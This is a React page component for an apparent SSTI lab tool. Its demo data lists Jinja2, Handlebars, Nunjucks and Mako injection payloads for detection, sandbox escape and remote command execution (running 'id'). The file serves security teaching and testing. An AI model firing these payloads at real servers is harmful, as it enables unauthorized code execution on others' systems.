import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { Crosshair } from 'lucide-react';
import { Card } from '../components/ui/Card';
import { StatusDot } from '../components/ui/StatusDot';
import { EngineBadge } from '../components/ui/Badge';
import { Button } from '../components/ui/Button';
import { CodeViewer } from '../components/ui/CodeViewer';
import type { Engine, EngineId } from '../types';

const DEMO_ENGINES: Engine[] = [
  {
    id: 'jinja2',
    name: 'Jinja2',
    language: 'Python',
    framework: 'Flask / Django',
    status: 'offline',
    description: 'Jinja2 is a full-featured template engine for Python with a powerful automatic HTML escaping system. SSTI occurs when user input is rendered without sandboxing.',
    detection_syntax: '{{7*7}} → 49',
    fingerprint_example: '{{config.__class__.__init__.__globals__}}',
    escape_example: '{{"".__class__.__mro__[1].__subclasses__()}}',
    rce_example: '{{"".__class__.__mro__[1].__subclasses__()[396]("id",shell=True,stdout=-1).communicate()[0]}}',
  },
  {
    id: 'handlebars',
    name: 'Handlebars',
    language: 'JavaScript',
    framework: 'Node.js / Express',
    status: 'offline',
    description: 'Handlebars.js is a minimal templating engine. SSTI typically leverages prototype chain traversal to access dangerous constructors and execute arbitrary code.',
    detection_syntax: '{{7*7}} → 49 (or no-op)',
    fingerprint_example: '{{#with "s" as |string|}}{{string.sub "constructor"}}{{/with}}',
    escape_example: '{{#with "s" as |string|}}...prototype chain...{{/with}}',
    rce_example: '{{#with "s" as |string|}}{{lookup (lookup string "constructor") "constructor"}}{{/with}}',
  },
  {
    id: 'nunjucks',
    name: 'Nunjucks',
    language: 'JavaScript',
    framework: 'Node.js',
    status: 'offline',
    description: 'Nunjucks is a rich and powerful templating language for JavaScript inspired by Jinja2. Its range.constructor allows arbitrary function construction.',
    detection_syntax: '{{7*7}} → 49',
    fingerprint_example: '{{settings}}',
    escape_example: '{{range.constructor("return process.env")()}}',
    rce_example: '{{range.constructor("return require(\'child_process\').execSync(\'id\').toString()")()}}',
  },
  {
    id: 'mako',
    name: 'Mako',
    language: 'Python',
    framework: 'Pyramid / FastAPI',
    status: 'offline',
    description: 'Mako is a template library written in Python and provides Python-like expressions. SSTI in Mako is severe as Python code executes natively in templates.',
    detection_syntax: '${7*7} → 49',
    fingerprint_example: '${self.__dict__}',
    escape_example: '<% import os %>${os.listdir("/")}',
    rce_example: '<% import subprocess %>${subprocess.check_output(["id"])}',
  },
];

const ENGINE_LANG_COLORS: Record<string, string> = {
  Python: 'var(--color-ssti)',
  JavaScript: 'var(--color-primary)',
};

export const Engines: React.FC = () => {
  const navigate = useNavigate();
  const [selected, setSelected] = useState<Engine | null>(null);
  const [engines] = useState<Engine[]>(DEMO_ENGINES);

  return (
    <div style={{ padding: '24px', height: '100%', overflow: 'auto' }}>
      <div style={{ maxWidth: 1200, margin: '0 auto' }}>
        <div style={{ marginBottom: 24, display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <div>
            <h2 style={{ fontSize: 22, fontFamily: 'var(--font-heading)', marginBottom: 4 }}>Template Engines</h2>
            <p style={{ color: 'var(--text-muted)', fontSize: 13 }}>SSTI attack surfaces across supported engines</p>
          </div>
        </div>

        {/* Engine grid */}
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: 16, marginBottom: 32 }}>
          {engines.map((eng, idx) => (
            <motion.div
              key={eng.id}
              initial={{ opacity: 0, y: 16 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: idx * 0.08 }}
            >
              <Card
                interactive
                onClick={() => setSelected(selected?.id === eng.id ? null : eng)}
                style={{
                  border: `1px solid ${selected?.id === eng.id ? 'var(--color-primary)' : 'var(--border-subtle)'}`,
                }}
              >
                <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', marginBottom: 14 }}>
                  <div>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
                      <EngineBadge engine={eng.id as EngineId} />
                      <span style={{
                        fontSize: 10,
                        fontFamily: 'var(--font-mono)',
                        color: ENGINE_LANG_COLORS[eng.language] ?? 'var(--color-neutral)',
                        background: `${ENGINE_LANG_COLORS[eng.language] ?? 'var(--color-neutral)'}18`,
                        border: `1px solid ${ENGINE_LANG_COLORS[eng.language] ?? 'var(--color-neutral)'}40`,
                        borderRadius: 4,
                        padding: '2px 6px',
                      }}>
                        {eng.language}
                      </span>
                    </div>
                    <h3 style={{ fontFamily: 'var(--font-heading)', fontSize: 18, fontWeight: 600 }}>
                      {eng.name}
                    </h3>
                    <p style={{ color: 'var(--text-muted)', fontSize: 12, marginTop: 2 }}>{eng.framework}</p>
                  </div>
                  <StatusDot status={eng.status} />
                </div>

                <p style={{ color: 'var(--text-secondary)', fontSize: 13, lineHeight: 1.6, marginBottom: 14 }}>
                  {eng.description.slice(0, 100)}...
                </p>

                <div style={{ background: 'var(--bg-nested)', borderRadius: 6, padding: '8px 12px' }}>
                  <div style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color: 'var(--text-muted)', marginBottom: 4, textTransform: 'uppercase' }}>
                    Detection
                  </div>
                  <code style={{ fontFamily: 'var(--font-mono)', fontSize: 12, color: 'var(--color-detection)' }}>
                    {eng.detection_syntax}
                  </code>
                </div>

                <div style={{ display: 'flex', gap: 8, marginTop: 14 }}>
                  <Button
                    variant="primary"
                    size="sm"
                    icon={<Crosshair size={11} />}
                    onClick={() => navigate('/lab')}
                  >
                    Open in Lab
                  </Button>
                </div>
              </Card>
            </motion.div>
          ))}
        </div>

        {/* Engine detail */}
        {selected && (
          <motion.div
            initial={{ opacity: 0, y: 16 }}
            animate={{ opacity: 1, y: 0 }}
            style={{
              background: 'var(--bg-panel)',
              border: '1px solid var(--border-muted)',
              borderRadius: 'var(--radius-xl)',
              padding: '24px',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 20 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                <EngineBadge engine={selected.id as EngineId} size="md" />
                <h3 style={{ fontSize: 20, fontFamily: 'var(--font-heading)' }}>{selected.name}</h3>
              </div>
              <Button variant="ghost" size="sm" onClick={() => setSelected(null)}>Close</Button>
            </div>

            <p style={{ color: 'var(--text-secondary)', fontSize: 14, lineHeight: 1.7, marginBottom: 20 }}>
              {selected.description}
            </p>

            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: 16 }}>
              {[
                { label: 'Detection', code: selected.detection_syntax, color: 'var(--color-detection)' },
                { label: 'Fingerprint', code: selected.fingerprint_example, color: 'var(--color-primary)' },
                { label: 'Escape Sandbox', code: selected.escape_example, color: 'var(--color-execution)' },
                { label: 'RCE', code: selected.rce_example, color: 'var(--color-critical)' },
              ].map(({ label, code, color }) => (
                <div key={label}>
                  <div style={{ fontSize: 10, fontFamily: 'var(--font-mono)', color, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 6 }}>
                    {label}
                  </div>
                  <CodeViewer code={code} maxHeight={100} />
                </div>
              ))}
            </div>
          </motion.div>
        )}
      </div>
    </div>
  );
};
